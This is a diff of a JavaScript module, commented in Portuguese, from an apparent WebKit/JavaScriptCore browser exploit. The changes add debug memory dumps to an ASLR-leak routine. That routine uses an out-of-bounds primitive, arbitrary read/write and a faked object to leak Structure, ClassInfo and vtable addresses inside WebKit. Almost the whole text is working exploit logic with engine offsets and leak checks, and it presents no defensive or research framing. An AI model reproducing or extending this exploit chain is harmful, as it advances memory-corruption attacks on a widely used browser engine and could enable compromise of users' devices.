@@ -4,8 +4,8 @@
 // FOCO: Fortificar a estabilidade da alocação do ArrayBuffer/DataView usado para OOB.
 // =======================================================================================
 
-import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
-import {
+import { AdvancedInt64, toHex, isAdvancedInt64Object, log, PAUSE } from '../utils.mjs'; // Importa log e PAUSE do utils.mjs
+import { // Importa funções core
     triggerOOB_primitive,
     getOOBDataView,
     clearOOBEnvironment,
@@ -15,8 +15,8 @@ import {
     arb_read,
     arb_write,
     selfTestOOBReadWrite,
-    oob_read_absolute,
-    oob_write_absolute,
+    oob_read_absolute, // Não é usado diretamente para ARB R/W, mas mantido
+    oob_write_absolute, // Não é usado diretamente para ARB R/W, mas mantido
     setupOOBMetadataForArbitraryAccess // Importar a nova função
 } from '../core_exploit.mjs';
 
@@ -51,7 +51,7 @@ async function dumpMemory(address, size, logFn, arbReadFn, sourceName = "Dump") 
         for (let j = 0; j < bytesPerRow; j++) {
             if (i + j < size) {
                 try {
-                    const byte = await arbReadFn(address.add(i + j), 1); // Remover logFn, pois já é passado como parâmetro.
+                    const byte = await arbReadFn(address.add(i + j), 1, logFn);
                     rowBytes.push(byte);
                     hexLine += byte.toString(16).padStart(2, '0') + " ";
                     asciiLine += (byte >= 0x20 && byte <= 0x7E) ? String.fromCharCode(byte) : '.';
@@ -439,33 +439,38 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
         // Tentar novamente a leitura do ponteiro da Structure após a modificação dos metadados
         // structure_pointer_from_dummy_object_addr é o endereço do ponteiro para a Structure (dentro do JSCell)
         const structure_pointer_from_dummy_object_addr = dummy_object_addr.add(JSC_OFFSETS_PARAM.JSCell.STRUCTURE_POINTER_OFFSET);
-        logFn(`[ASLR LEAK] Lendo o ponteiro da Structure em ${structure_pointer_from_dummy_object_addr.toString(true)}...`, "debug");
         const structure_address_from_leak = await arb_read(structure_pointer_from_dummy_object_addr, 8); // Valor do ponteiro para o objeto Structure
 
         logFn(`[ASLR LEAK] Endereço da Structure do dummy_object (vazado): ${structure_address_from_leak.toString(true)}`, "leak");
+        // DEBUG: DUMP DA MEMÓRIA AO REDOR DO ENDEREÇO DA STRUCTURE VAZADA
+        if (!structure_address_from_leak.equals(AdvancedInt64.Zero)) {
+            logFn(`[ASLR LEAK] DEBUG: Dump de 0x80 bytes ao redor de ${structure_address_from_leak.toString(true)}`, "debug");
+            await dumpMemory(structure_address_from_leak.sub(0x40), 0x80, logFn, arb_read, "Structure Leak Context");
+            await pauseFn(LOCAL_SHORT_PAUSE);
+        }
+
 
         if (!isAdvancedInt64Object(structure_address_from_leak) || structure_address_from_leak.equals(AdvancedInt64.Zero)) {
             const errMsg = `Falha na leitura do ponteiro da Structure do dummy_object após ajuste: ${structure_address_from_leak.toString(true)}. Abortando ASLR leak.`;
             logFn(errMsg, "critical");
             throw new Error(errMsg);
         }
-        
-        // NOVO: Dump da Structure
-        logFn(`[ASLR LEAK] Realizando dump da Structure em ${structure_address_from_leak.toString(true)} para análise.`, "debug");
-        await dumpMemory(structure_address_from_leak, 0x100, logFn, arb_read, "Structure Dump"); // Dump dos primeiros 256 bytes
 
         // AGORA, vazaremos o endereço da Vtable da ClassInfo, que está dentro da WebKit
         // ClassInfo Address = Structure Address + JSC_OFFSETS.Structure.CLASS_INFO_OFFSET (0x50)
         const class_info_address = structure_address_from_leak.add(JSC_OFFSETS_PARAM.Structure.CLASS_INFO_OFFSET);
         logFn(`[ASLR LEAK] Endereço da ClassInfo do dummy_object: ${class_info_address.toString(true)}`, "info");
-        
-        // NOVO: Dump da ClassInfo
-        logFn(`[ASLR LEAK] Realizando dump da ClassInfo em ${class_info_address.toString(true)} para análise.`, "debug");
-        await dumpMemory(class_info_address, 0x60, logFn, arb_read, "ClassInfo Dump"); // Dump de uns 96 bytes
 
         // Endereço da Vtable da ClassInfo = ClassInfo Address + JSC_OFFSETS.ClassInfo.M_CACHED_TYPE_INFO_OFFSET (0x8)
         const vtable_class_info_address_in_webkit = await arb_read(class_info_address.add(JSC_OFFSETS_PARAM.ClassInfo.M_CACHED_TYPE_INFO_OFFSET), 8);
         logFn(`[ASLR LEAK] Endereço da Vtable da ClassInfo do dummy_object (dentro do WebKit): ${vtable_class_info_address_in_webkit.toString(true)}`, "leak");
+        // DEBUG: DUMP DA MEMÓRIA AO REDOR DO ENDEREÇO DA VTABLE CLASSINFO VAZADA
+        if (!vtable_class_info_address_in_webkit.equals(AdvancedInt64.Zero)) {
+            logFn(`[ASLR LEAK] DEBUG: Dump de 0x80 bytes ao redor de ${vtable_class_info_address_in_webkit.toString(true)} (espera-se ponteiro para .text)`, "debug");
+            await dumpMemory(vtable_class_info_address_in_webkit.sub(0x40), 0x80, logFn, arb_read, "Vtable ClassInfo Leak Context");
+            await pauseFn(LOCAL_SHORT_PAUSE);
+        }
+
 
         if (!isAdvancedInt64Object(vtable_class_info_address_in_webkit) || vtable_class_info_address_in_webkit.equals(AdvancedInt64.Zero) || (vtable_class_info_address_in_webkit.low() & 0xFFF) !== 0x000) {
             const errMsg = `Vtable da ClassInfo (${vtable_class_info_address_in_webkit.toString(true)}) é inválida ou não alinhada. Abortando ASLR leak.`;
@@ -579,7 +584,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
         }
 
         const original_val_prop = test_obj_post_leak.val1 || test_obj_post_leak.test_val_prop;
-        logFn(`Valor original de 'val1'/'test_val_prop' no objeto de teste: ${toHex(original_val_prop)}`, 'debug');
+        logFn(`Valor original de 'val1'/'test_val_prop' no objeto de teste (via fake): ${toHex(original_val_prop)}`, 'debug');
 
         faked_obj_for_post_leak_test.val1 = 0x1337BEEF;
         await pauseFn(LOCAL_VERY_SHORT_PAUSE);
@@ -664,6 +669,3 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
         tc_probe_details: { strategy: 'UAF/TC -> ARB R/W' }
     };
 }
-
-}
-
